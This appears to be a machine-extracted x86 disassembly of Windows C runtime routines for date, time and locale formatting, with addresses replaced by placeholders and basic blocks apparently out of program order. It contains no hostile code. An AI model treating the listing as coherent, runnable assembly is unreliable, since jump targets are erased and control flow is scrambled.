mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0x98 ] edi
push [ esi + 0x98 ]
push eax
push edi
call sub_4192c8
add esp 0xc
test eax eax
je r-xdata
push edi
call sub_4136f0
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0x9c ] edi
push [ esi + 0x9c ]
push eax
push edi
call sub_4192c8
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d5e2
add esp 0x14
push edi
call sub_4136f0
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0xa0 ] edi
push [ esi + 0xa0 ]
push eax
push edi
call sub_4192c8
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d5e2
add esp 0x14
push edi
call sub_4136f0
lea edi [ edi + eax + 0x1 ]
mov eax ebx
sub eax edi
add eax [ ebp - 0x8 ]
mov [ ebx + 0xa4 ] edi
push [ esi + 0xa4 ]
push eax
push edi
call sub_4192c8
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d5e2
add esp 0x14
push edi
call sub_4136f0
lea eax [ edi + eax + 0x1 ]
mov ecx ebx
sub ecx eax
add ecx [ ebp - 0x8 ]
mov [ ebx + 0xa8 ] eax
push [ esi + 0xa8 ]
push ecx
push eax
call sub_4192c8
add esp 0x10
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d5e2
add esp 0x14
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40d5e2
add esp 0x14
sub_41c1d9
cmp [ eax ] 0x0
push esi
mov esi edx
je r-xdata
pop esi
retn
push edi
pop edi
mov edi [ ecx ]
mov [ edi ] dl
inc [ ecx ]
inc esi
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
mov dl [ esi ]
test dl dl
je r-xdata
sub_41c1f9
cmp [ esi ] 0x1
mov ecx [ edi ]
push ebx
jbe r-xdata
mov eax [ edi ]
mov [ edi ] ecx
dec ecx
push 0xa
cdq
pop ebx
idiv ebx
add dl 0x30
mov [ ecx ] dl
inc ecx
dec [ esi ]
mov edx [ esi ]
test eax eax
jle r-xdata
mov bl [ eax ]
mov dl [ ecx ]
mov [ ecx ] bl
dec ecx
mov [ eax ] dl
inc eax
cmp eax ecx
jb r-xdata
pop ebx
retn
cmp edx 0x1
ja r-xdata
sub_41c22f
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp [ ebp + 0x8 ] edx
je r-xdata
cmp esi [ ecx ]
jae r-xdata
cmp [ ecx ] 0x1
mov esi [ edi ]
jbe r-xdata
mov [ ecx ] edx
dec esi
lea edx [ esi + 0x1 ]
test edx edx
je r-xdata
mov eax [ edi ]
mov [ edi ] esi
dec esi
push 0xa
cdq
pop ebx
idiv ebx
add dl 0x30
mov [ esi ] dl
inc esi
dec [ ecx ]
mov edx [ ecx ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
add [ edi ] eax
sub [ ecx ] eax
jmp r-xdata
push 0xa
cdq
pop ebx
idiv ebx
mov ebx [ edi ]
add dl 0x30
inc [ ebp - 0x4 ]
mov [ esi + ebx ] dl
dec esi
cmp esi 0xffffffff
jne r-xdata
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
cmp eax esi
jb r-xdata
jmp r-xdata
cmp edx 0x1
ja r-xdata
pop esi
pop ebx
leave
retn
sub_41c2aa
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
movsx eax al
cmp eax 0x59
push esi
push edi
mov ebx ecx
mov esi edx
jg r-xdata
cmp eax 0x6d
jg r-xdata
je r-xdata
sub eax 0x70
je r-xdata
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0xfffff894
jl r-xdata
cmp eax 0x49
jg r-xdata
mov esi [ esi + 0x8 ]
xor edi edi
cmp esi edi
jl r-xdata
sub eax 0x7
je r-xdata
mov esi [ esi + 0x10 ]
xor edi edi
cmp esi edi
jl r-xdata
sub eax 0x5a
je r-xdata
call sub_40d7cc
xor edi edi
jmp r-xdata
cmp eax 0x1fa3
jle r-xdata
sub eax 0x4d
je r-xdata
je r-xdata
call sub_40d7cc
cmp esi 0x17
jg r-xdata
mov eax [ esi + 0x18 ]
xor edi edi
cmp eax edi
jl r-xdata
dec eax
je r-xdata
cmp esi 0xb
jg r-xdata
call sub_427e9b
call sub_42774d
mov edx eax
xor eax eax
cmp [ esi + 0x20 ] eax
mov ecx ebx
setne al
mov ebx eax
mov edx [ edx + ebx * 4 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub eax 0x7
je r-xdata
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
cdq
push 0x64
pop ecx
idiv ecx
push [ ebp + 0x14 ]
push 0x4
add eax 0x13
imul eax eax 0x64
add eax edx
jmp r-xdata
mov eax [ esi + 0x4 ]
jmp r-xdata
push 0x6
pop ecx
sub eax ecx
je r-xdata
mov eax [ esi + 0x8 ]
xor edi edi
cmp eax edi
jl r-xdata
sub eax 0x4
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xb
mov edx [ ebp + 0x10 ]
jg r-xdata
cmp eax 0x6
jg r-xdata
push [ ebp + 0x10 ]
xor edi edi
push [ ebp + 0xc ]
push ebx
push esi
cmp [ ebp + 0x14 ] edi
je r-xdata
dec eax
je r-xdata
lea eax [ esi + 0x1 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
call sub_41c1d9
mov esi [ esi + 0x18 ]
xor edi edi
cmp esi edi
jl r-xdata
dec eax
je r-xdata
pop edx
xor edi edi
cmp eax edi
jl r-xdata
mov eax [ esi ]
dec eax
dec eax
je r-xdata
cmp eax 0x17
jg r-xdata
xor eax eax
inc eax
sub eax 0x9
je r-xdata
mov edx [ edx + 0x9c ]
mov edx [ edx + 0x98 ]
jmp r-xdata
push [ ebp + 0x14 ]
xor edx edx
inc edx
jmp r-xdata
push edi
jmp r-xdata
push 0x1
jmp r-xdata
mov eax [ esi + 0x14 ]
xor edi edi
cmp eax edi
jl r-xdata
dec eax
jne r-xdata
push [ ebp + 0x14 ]
cmp esi 0x6
jle r-xdata
mov esi [ esi + 0x10 ]
xor edi edi
cmp esi edi
jl r-xdata
dec eax
je r-xdata
cmp eax 0x3b
jmp r-xdata
mov eax [ esi + 0x18 ]
xor edi edi
cmp eax edi
jl r-xdata
dec eax
dec eax
je r-xdata
cdq
push 0xc
pop ecx
idiv ecx
mov eax edx
cmp eax edi
jne r-xdata
sub eax 0x18
je r-xdata
mov ecx [ ebp + 0xc ]
mov edi ebx
call sub_41c22f
pop ecx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_41c692
add esp 0x18
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
cdq
push 0x64
pop ecx
idiv ecx
mov eax edx
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 ]
jmp r-xdata
cmp esi 0xb
jg r-xdata
push [ ebp + 0x10 ]
xor edi edi
push [ ebp + 0xc ]
push ebx
push esi
cmp [ ebp + 0x14 ] edi
je r-xdata
dec eax
je r-xdata
jg r-xdata
cmp eax ecx
jg r-xdata
mov eax [ esi + 0x18 ]
xor edi edi
cmp eax edi
jl r-xdata
dec eax
jne r-xdata
push ecx
pop eax
jmp r-xdata
mov eax [ ebx ]
mov [ eax ] 0x25
mov eax [ ebp + 0xc ]
inc [ ebx ]
dec [ eax ]
jmp r-xdata
sub eax 0x1c
je r-xdata
jmp r-xdata
push 0x2
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x38 ]
jmp r-xdata
push edi
jmp r-xdata
push 0x1
mov esi [ esi + 0xc ]
cmp esi 0x1
jl r-xdata
sub eax 0x6
jne r-xdata
jmp r-xdata
mov ecx eax
cmp eax ecx
jg r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
jmp r-xdata
mov esi [ esi + 0x18 ]
xor edi edi
cmp esi edi
jl r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
call sub_41c692
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] edi
je r-xdata
cmp esi 0x1f
jg r-xdata
mov esi [ esi + 0x1c ]
xor edi edi
cmp esi edi
jl r-xdata
cmp eax 0x16d
jg r-xdata
cmp eax edi
je r-xdata
push ebx
push esi
push 0x2
cmp esi 0x6
jg r-xdata
mov esi [ esi + 0x10 ]
xor edi edi
cmp esi edi
jl r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebx ]
push [ ebp + 0x10 ]
mov [ eax ] 0x20
mov eax [ ebp + 0xc ]
inc [ ebx ]
dec [ eax ]
push eax
mov eax esi
cmp esi 0x16d
jg r-xdata
cmp eax ecx
jge r-xdata
mov eax [ esi + 0x1c ]
cmp eax edi
jl r-xdata
lea ecx [ eax - 0x1 ]
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x1c ]
jmp r-xdata
cmp esi 0xb
jg r-xdata
mov eax [ esi + 0x8 ]
xor edi edi
cmp eax edi
jl r-xdata
push [ ebp + 0x14 ]
lea eax [ esi + 0x1 ]
push 0x3
jmp r-xdata
push 0x7
cdq
pop esi
idiv esi
cmp edx ecx
jl r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x68 ]
jmp r-xdata
cmp eax 0x17
inc eax
jmp r-xdata
sub_41c692
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x1c ]
xor ebx ebx
sub eax ebx
push edi
je r-xdata
mov edi [ esi + 0xa0 ]
dec eax
je r-xdata
mov al [ edi ]
test al al
je r-xdata
cmp [ ebp + 0xc ] 0x2
mov ecx [ GetDateFormatA@IAT ]
jne r-xdata
mov edi [ esi + 0xa4 ]
jmp r-xdata
mov edi [ esi + 0xa8 ]
jmp r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0x18 ]
mov esi [ ebp + 0x14 ]
mov edx 0x76c
add dx [ eax + 0x14 ]
push ebx
mov [ ebp - 0x20 ] dx
mov dx [ eax + 0x10 ]
inc dx
mov [ ebp - 0x1e ] dx
mov dx [ eax + 0xc ]
mov [ ebp - 0x1a ] dx
mov dx [ eax + 0x8 ]
mov [ ebp - 0x18 ] dx
mov dx [ eax + 0x4 ]
mov ax [ eax ]
mov [ ebp - 0x14 ] ax
push ebx
xor eax eax
push edi
mov [ ebp - 0x12 ] ax
lea eax [ ebp - 0x20 ]
push eax
push ebx
push [ esi + 0xac ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x16 ] dx
call ecx
mov [ ebp - 0x10 ] eax
cmp eax ebx
je r-xdata
mov ecx [ GetTimeFormatA@IAT ]
cmp [ esi + 0xb0 ] 0x1
mov eax [ ebp + 0x10 ]
je r-xdata
xor edx edx
mov [ ebp - 0x8 ] edx
mov ecx edi
add eax 0x8
cmp eax 0x400
jg r-xdata
inc ecx
inc edx
cmp [ ecx ] al
je r-xdata
mov [ ebp - 0xc ] ecx
movsx ecx al
cmp ecx 0x64
jg r-xdata
push eax
call sub_4107e9
pop ecx
cmp eax ebx
je r-xdata
call sub_4275c0
mov eax esp
cmp eax ebx
je r-xdata
mov eax ecx
sub eax 0x68
je r-xdata
je r-xdata
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov eax edx
dec eax
je r-xdata
sub eax 0x5
je r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x27
je r-xdata
push [ ebp - 0x10 ]
mov ebx eax
push ebx
push edi
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push [ esi + 0xac ]
call [ ebp - 0xc ]
dec eax
test eax eax
jle r-xdata
add eax 0x8
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
sub eax 0x6
je r-xdata
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
add edi edx
test dl 0x1
je r-xdata
cmp ecx 0x41
je r-xdata
push [ ebp - 0x8 ]
call sub_41a5c6
pop ecx
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
xor eax eax
jmp r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
mov al 0x49
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
dec eax
je r-xdata
push [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
push [ ebp + 0x1c ]
mov ecx esi
push ebx
push [ ebp + 0x8 ]
call sub_41c2aa
add esp 0x10
test eax eax
je r-xdata
mov al 0x64
jmp r-xdata
dec eax
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
mov al [ edi ]
test al al
je r-xdata
push r--data
push edi
call sub_427f63
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp ecx 0x48
je r-xdata
mov edx [ ecx ]
mov [ ebp - 0x10 ] eax
mov al [ ebx ]
mov [ edx ] al
inc [ ecx ]
mov eax [ ebp - 0x10 ]
inc ebx
dec [ esi ]
dec eax
test eax eax
jg r-xdata
lea esp [ ebp - 0x2c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b762
leave
retn
push [ ebp + 0x8 ]
push ecx
call sub_413987
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x4d
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x8 ] 0xb
mov eax [ ebp + 0x1c ]
jg r-xdata
sub eax 0x5
jne r-xdata
mov al 0x61
jmp r-xdata
dec eax
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
push r--data
push edi
call sub_427f63
pop ecx
pop ecx
test eax eax
jne r-xdata
add edi 0x5
jmp r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x4d
je r-xdata
cmp [ esi ] 0x0
jbe r-xdata
mov cl [ edi ]
mov eax [ esi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x1
jbe r-xdata
mov al 0x53
jmp r-xdata
jmp r-xdata
mov edi [ eax + 0x9c ]
mov edi [ eax + 0x98 ]
jmp r-xdata
mov eax edx
dec eax
dec eax
je r-xdata
mov al 0x41
jmp r-xdata
cmp al 0x27
je r-xdata
mov al 0x70
jmp r-xdata
add edi 0x3
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x61
je r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebx ] 0x0
jbe r-xdata
cmp edx 0x1
jne r-xdata
mov al 0x79
jmp r-xdata
dec eax
dec eax
jne r-xdata
inc edi
jmp r-xdata
push [ ebp + 0x8 ]
movsx eax al
push eax
call sub_413987
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x48
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
dec eax
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
dec [ ebx ]
mov edi eax
cmp [ ebx ] 0x0
jbe r-xdata
jmp r-xdata
movsx eax [ edi ]
push [ ebp + 0x8 ]
push eax
call sub_413987
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x59
jmp r-xdata
mov eax [ esi ]
mov cl [ edi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebx ] 0x1
jbe r-xdata
mov al 0x6d
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
movsx eax al
push eax
call sub_413987
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi ]
mov cl [ edi ]
mov [ eax ] cl
inc [ esi ]
dec [ ebx ]
jmp r-xdata
cmp [ ebx ] 0x1
jbe r-xdata
jmp r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
mov al 0x62
jmp r-xdata
dec eax
jne r-xdata
mov cl [ edi ]
mov eax [ esi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x1
jbe r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
dec [ ebx ]
mov edi eax
mov al 0x42
jmp r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
dec [ ebx ]
mov edi eax
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
dec [ ebx ]
mov edi eax
sub_41caf3
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push ebx
push [ ebp + 0x1c ]
xor ebx ebx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] eax
call sub_40c8c3
mov eax [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
cmp [ ebp - 0x14 ] bl
je r-xdata
push esi
mov esi [ ebp + 0x10 ]
mov [ eax ] bl
cmp esi ebx
je r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
cmp [ ebp - 0x14 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
mov eax [ ebp + 0x18 ]
cmp eax ebx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
xor eax eax
mov eax [ ebp - 0x18 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] edi
cmp edi ebx
jbe r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0xd4 ]
pop edi
mov eax [ ebp - 0x10 ]
mov [ eax ] bl
cmp [ ebp - 0x8 ] ebx
jne r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
cmp [ ebp - 0x4 ] ebx
ja r-xdata
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
cmp al 0x25
je r-xdata
call sub_40d7cc
mov [ eax ] 0x22
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] bl
sub edi [ ebp - 0x4 ]
mov eax edi
cmp [ ebp - 0x14 ] bl
je r-xdata
mov edx [ ebp + 0x14 ]
cmp edx ebx
je r-xdata
lea ecx [ ebp - 0x20 ]
movsx eax al
push ecx
push eax
call sub_413987
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x14 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x18 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc esi
xor eax eax
cmp [ esi ] 0x23
jne r-xdata
mov al [ esi ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
inc [ ebp + 0x8 ]
inc esi
dec [ ebp - 0x4 ]
jmp r-xdata
xor ecx ecx
inc ecx
cmp [ ebp - 0x4 ] ecx
jbe r-xdata
push eax
push [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov al [ esi ]
lea ecx [ ebp + 0x8 ]
call sub_41c2aa
add esp 0x10
test eax eax
je r-xdata
inc eax
inc esi
cmp [ ebp - 0x4 ] ebx
ja r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
inc esi
mov [ ebp - 0x8 ] ecx
mov cl [ esi ]
mov edx [ ebp + 0x8 ]
mov [ edx ] cl
inc [ ebp + 0x8 ]
dec [ ebp - 0x4 ]
mov esi eax
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub_41cc97
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41caf3
add esp 0x18
pop ebp
retn
sub_41ccb7
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41caf3
add esp 0x18
pop ebp
retn
sub_41ccd6
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41caf3
add esp 0x18
pop ebp
retn
sub_41cd20
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_41cd66
mov edi edi
push ebp
mov ebp esp
xor eax eax
push ebx
xor ebx ebx
inc eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
xor ecx ecx
test eax eax
sete cl
pop ebx
mov eax ecx
pop ebp
retn
push esi
push edi
pop edi
pop esi
mov eax [ ebp + 0xc ]
add eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
lea edi [ eax + esi * 8 ]
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_428071
pop ecx
pop ecx
test eax eax
jne r-xdata
jge r-xdata
mov ecx [ ebp + 0x10 ]
add edi 0x4
mov [ ecx ] edi
jmp r-xdata
lea ebx [ esi + 0x1 ]
dec esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jle r-xdata
test eax eax
je r-xdata
sub_41cddc
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
test esi esi
je r-xdata
push 0x8
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ edi + 0x1c ]
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push r--data
push eax
call sub_4196a0
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
call sub_4196a0
pop ecx
pop ecx
test eax eax
je r-xdata
lea esi [ ebp - 0xc ]
call [ GetACP@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40b762
leave
retn
push r--data
push esi
call sub_4196a0
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_4280c3
pop ecx
push 0x8
lea eax [ ebp - 0xc ]
push eax
push 0xb
push [ edi + 0x1c ]
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
sub_41ce80
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
inc eax
inc eax
cmp eax 0x14
jb r-xdata
mov cx [ ebp + 0x8 ]
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_41cea4
mov edi edi
push esi
xor esi esi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
mov al cl
sub al 0x61
inc edx
cmp al 0x5
ja r-xdata
mov eax esi
pop esi
retn
mov al cl
sub al 0x41
cmp al 0x5
ja r-xdata
add cl 0xd9
jmp r-xdata
movsx eax cl
shl esi 0x4
lea esi [ esi + eax - 0x30 ]
add cl 0xf9
sub_41ced8
xor eax eax
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
retn
inc eax
jmp r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x41
jl r-xdata
sub_41cef3
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_40e99d
mov esi eax
mov edx edi
add esi 0x9c
call sub_41cea4
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_428071
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_41ce80
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40b762
leave
retn 0x4
or [ esi + 0x8 ] 0x4
mov [ esi + 0x1c ] edi
mov [ esi + 0x18 ] edi
sub_41cf8b
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0x3ff
push 0x1
or eax 0x400
push eax
mov esi ecx
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x7c ]
call sub_41cea4
cmp [ ebp + 0x8 ] eax
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40b762
leave
retn
mov esi [ esi ]
push edi
mov edx esi
call sub_41ced8
push esi
mov edi eax
call sub_4136f0
pop ecx
cmp edi eax
pop edi
je r-xdata
sub_41cfff
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_40e99d
mov esi eax
mov edx edi
add esi 0x9c
call sub_41cea4
mov ebx [ GetLocaleInfoA@IAT ]
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_428071
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax 0x300
and ecx eax
cmp ecx eax
je r-xdata
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b762
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_428071
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_428071
pop ecx
xor ebx ebx
pop ecx
test eax eax
jne r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
or [ esi + 0x8 ] 0x304
mov [ esi + 0x18 ] edi
jmp r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
or [ esi + 0x8 ] 0x200
mov eax [ esi + 0x8 ]
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] edi
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
or eax 0x100
mov [ esi + 0x8 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
test dl 0x1
jne r-xdata
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_4212b2
add esp 0xc
test eax eax
jne r-xdata
